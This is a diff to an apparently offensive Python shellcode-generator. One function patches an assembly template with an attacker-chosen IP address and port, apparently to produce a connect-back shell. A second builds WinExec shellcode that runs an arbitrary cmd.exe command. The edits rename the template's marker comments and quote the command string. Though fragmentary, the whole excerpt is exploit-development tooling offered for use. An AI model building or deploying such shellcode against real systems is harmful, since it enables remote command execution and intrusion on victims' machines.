@@ -78,25 +78,25 @@ def GenerateCDRTShell(Ip: str, Port: str):
             HexIp = str(hex(int("ffffffff", 16) - int(HexIp, 16)))[2:]
             HexPort = str(hex(int("ffff", 16) - int(HexPort, 16)))[2:]
             Content = Content.replace(
-                'sub ebx, 0xfeffff80 ; ANDROS03 IP', "sub ebx, 0x" + HexIp + "; ANDROS03 IP")
+                'sub ebx, 0xfeffff80 ; HEAPNOS03 IP', "sub ebx, 0x" + HexIp + "; HEAPNOS03 IP")
             Content = Content.replace(
-                'sub bx, 0x47DD ; ANDROS07 PORT', "sub bx, 0x" + HexPort + "; ANDROS07 PORT")
+                'sub bx, 0x47DD ; HEAPNOS07 PORT', "sub bx, 0x" + HexPort + "; HEAPNOS07 PORT")
     else:
         for i in range(0, len(Content)):
-            Content = Content.replace('xor ebx,ebx ; ANDROS01', "; ANDROS01")
+            Content = Content.replace('xor ebx,ebx ; HEAPNOS01', "; HEAPNOS01")
             Content = Content.replace(
-                'mov ebx, 0xffffffff ; ANDROS02', "; ANDROS02")
+                'mov ebx, 0xffffffff ; HEAPNOS02', "; HEAPNOS02")
             Content = Content.replace(
-                'sub ebx, 0xfeffff80 ; ANDROS03', "; ANDROS03")
-            Content = Content.replace('push ebx ; ANDROS04', "; ANDROS04")
-            Content = Content.replace('xor ebx,ebx ; ANDROS05', "; ANDROS05")
+                'sub ebx, 0xfeffff80 ; HEAPNOS03', "; HEAPNOS03")
+            Content = Content.replace('push ebx ; HEAPNOS04', "; HEAPNOS04")
+            Content = Content.replace('xor ebx,ebx ; HEAPNOS05', "; HEAPNOS05")
             Content = Content.replace(
-                'mov ebx, 0xffffffff ; ANDROS06', "; ANDROS06")
+                'mov ebx, 0xffffffff ; HEAPNOS06', "; HEAPNOS06")
             Content = Content.replace(
-                'sub bx, 0x47DD ; ANDROS07 PORT', "; ANDROS07")
-            Content = Content.replace('push bx ; ANDROS08', "; ANDROS08")
-            Content = Content.replace('; ANDROS09', "push 0x" + HexIp)
-            Content = Content.replace('; ANDROS10', "push word 0x" + HexPort)
+                'sub bx, 0x47DD ; HEAPNOS07 PORT', "; HEAPNOS07")
+            Content = Content.replace('push bx ; HEAPNOS08', "; HEAPNOS08")
+            Content = Content.replace('; HEAPNOS09', "push 0x" + HexIp)
+            Content = Content.replace('; HEAPNOS10', "push word 0x" + HexPort)
     File = open("shellcode.asm", "w+")
     File.write(Content)
     File.close()
@@ -124,6 +124,7 @@ def GenerateWinExec(command: str):
     Generate a WinExec("cmd.exe /C {command}") shellcode.
     -return string
     '''
+    command = "\"" + command + "\""
     HexCommand = LibDebug.StringToHex(LibDebug.RevertString(command))
     ParsedHexCommand = ""
     while len(HexCommand) % 8 != 0:
@@ -139,9 +140,10 @@ def GenerateWinExec(command: str):
     with open(".\ASM/ShellCodes/Custom_Dynamic_WinExec.asm", mode='r+') as f:
         Content = f.read()
     for i in range(0, len(Content)):
-        if 'push 0x636c6163 ; clac' in Content:
+        if 'push 0x636c6163 ; HEAPNOS' in Content:
             Content = Content.replace(
-                'push 0x636c6163 ; clac', ParsedHexCommand)
+                'push 0x636c6163 ; HEAPNOS', ParsedHexCommand)            
+    
     File = open("shellcode.asm", "w+")
     File.write(Content)
     File.close()
